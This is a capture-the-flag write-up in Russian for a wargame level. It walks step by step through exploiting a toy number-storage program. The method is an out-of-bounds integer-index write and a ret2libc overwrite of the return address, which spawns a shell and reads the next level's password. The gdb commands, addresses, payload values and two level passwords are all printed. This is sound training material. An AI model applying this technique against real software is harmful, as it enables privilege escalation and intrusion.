## HowTo

```bash
> su level07
GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
```

### Инструменты:
- Ida Pro + hex rays
- gdb + peda

**NB:** Для работы с файлом стягиваем его на локальную машину

### Анализ и ход решения
1. Программа представляет собой аналог простой БД, поддерживающей команды `store`, `read`, `quit`
2. `Store` - сохраняет значение по заданному индексу
3. `Read` - читает значение по индексу
4. В ходе выполнения `store` есть проверка на делимость адреса на `3` - ограничивающая нас в адресации. `index % 3`

**Идея взлома**
Переписать адрес возврата `eip`, подложив туда вызов `system(/bin/sh)`. 

1. Найдем адрес `system`
- анализ функций info functions показывает, что в области видимости есть функция `system`.
для нее не используется динамическая линковка, так что адрес (если мы его найдем) будет постоянным
```bash
> info func system
Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```
Как видим, используется статическая `system`. Попробуем найти ее адрес
```bash
> b *main
> r
> p system 
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

Найдем также адрес /bin/sh, т.к. он нужен нам в качестве аргумента для system
> find &system, +100000000, "/bin/sh"
0xf7f897ec
> 
```
- нашли адреса `system = 0xf7e6aed0 = 4159090384`, `/bin/sh = 0xf7f897ec = 4160264172`

2. Найдем адрес `eip`
```bash
> b *main
> run
info frame
Stack level 0, frame at 0xffffc890:
 eip = 0x8048723 in main; saved eip = 0xf7de5fa1
 called by frame at 0xffffc900
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffc890
 Saved registers:
  eip at 0xffffc88c
```
адрес `eip = 0xf7de5fa1`. Теперь нам нужно найти смещение от буфера до `eip`, чтобы определить переполнение
2. Найдем смещение от буффера до `eip`
```bash
> disass main       ----> Анализирует как буффер передается в функцию
...
   0x080488e3 <+448>:	lea    eax,[esp+0x24]          -> адрес буффера == esp + 0x24
   0x080488e7 <+452>:	mov    DWORD PTR [esp],eax
   0x080488ea <+455>:	call   0x8048630 <store_number>
...

> b *main+452
> run
...
> info registers esp
esp            0xffffc6a0	0xffffc6a0
> info frame
Stack level 0, frame at 0xffffc890:
 eip = 0x80488e7 in main; saved eip = 0xf7de5fa1
 called by frame at 0xffffc900
 Arglist at 0xffffc888, args: 
 Locals at 0xffffc888, Previous frame's sp is 0xffffc890
 Saved registers:
  ebx at 0xffffc87c, ebp at 0xffffc888, esi at 0xffffc880, edi at 0xffffc884, eip at 0xffffc88c
```
- адрес eip = `0xffffc88c`
- адрес esp = `0xffffc6a0`
- `offset == eip - esp - 0x24 (lea    eax,[esp+0x24]) = 0xffffc88c - 0xffffc6a0 - 0x24 = 0x1c8 == 456`
- смещение от буффера до  `eip` = `456 байт` или `114 int` (`456 / 4`)

3. Мы должны были бы положить адрес `system` в индекс `114`, но помним про проверку `index % 3`
`114 % 3 = 0`
4. Попробуем переполнить инт.
`(UINT_MAX + 456) / 4 = 1073741938`

5. Нам также нужно найти смещение для аргумента `system`. 
`(456 (eip_offset) + 8 (next pointer size)) / 4 = 116`. Не делиться нацело на `3`, также что проверку пройдет

5. Пробуем подмену `eip`.
- по индексу `1073741938` кладем адрес `system 4159090384`
- по индексу `116` кладем адрес `/bin/sh 4160264172`

```bash
./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store 
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: 4160264172
 Failed to do 4160264172 command
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami 
level08
$ pwd
/home/users/level07
$ cd ../level08
$ cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
